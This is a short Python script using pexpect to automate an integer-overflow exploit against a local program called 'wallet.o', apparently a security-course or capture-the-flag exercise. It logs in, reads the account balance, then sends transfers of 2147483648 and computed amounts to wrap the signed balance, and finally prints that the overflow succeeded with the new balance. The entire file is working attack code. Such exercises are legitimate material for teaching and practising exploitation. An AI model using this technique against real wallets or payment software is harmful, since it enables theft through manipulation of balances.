#!/usr/bin/python3
import sys, re, pexpect

usr = input("enter username to login with: ")
pwd = input("enter password to login with: ")
intMax = 2147483648
terminal = pexpect.spawn("/bin/bash", encoding='utf-8')
terminal.logfile = sys.stdout
terminal.sendline("./wallet.o")
terminal.expect("Login as:")
terminal.sendline(usr)
terminal.expect("Password:")
terminal.sendline(pwd)
terminal.expect("Choose")
terminal.sendline("1")
terminal.expect("Your")
index = terminal.expect(re.compile(r"\$(\-?\d+)"))
blnc = terminal.match.group(index)
blnc = int(blnc[1:])
terminal.sendline("")
terminal.expect("Choose")
terminal.sendline("0")
terminal.expect("Enter positive")
if blnc < 0:
	pay = blnc + intMax
	terminal.sendline(str(pay))
	terminal.expect("Enter recipient")
	terminal.sendline("-")
else:
	terminal.sendline(str(blnc))
	terminal.expect("Enter recipient")
	terminal.sendline("-")
	terminal.expect("Press enter")
	terminal.sendline("")
	terminal.expect("Choose")
	terminal.sendline("0")
	terminal.expect("Enter positive")
	terminal.sendline(str(intMax))
	terminal.expect("Enter recipient")
	terminal.sendline("-")
terminal.expect("Press enter")
terminal.sendline("")
terminal.expect("Choose")
terminal.sendline("0")
terminal.expect("Enter positive")
terminal.sendline("2")
terminal.expect("Enter recipient")
terminal.sendline("-")
terminal.expect("Press enter")
terminal.sendline("")
terminal.expect("Choose")
terminal.sendline("1")
terminal.expect("Your")
index = terminal.expect(re.compile(r"\$(\-?\d+)"))
blnc = terminal.match.group(index)
terminal.sendline("")
terminal.expect("Choose")
terminal.sendline("2")
print("integer overflow was successful - new balance on your account is: " + blnc)

input()
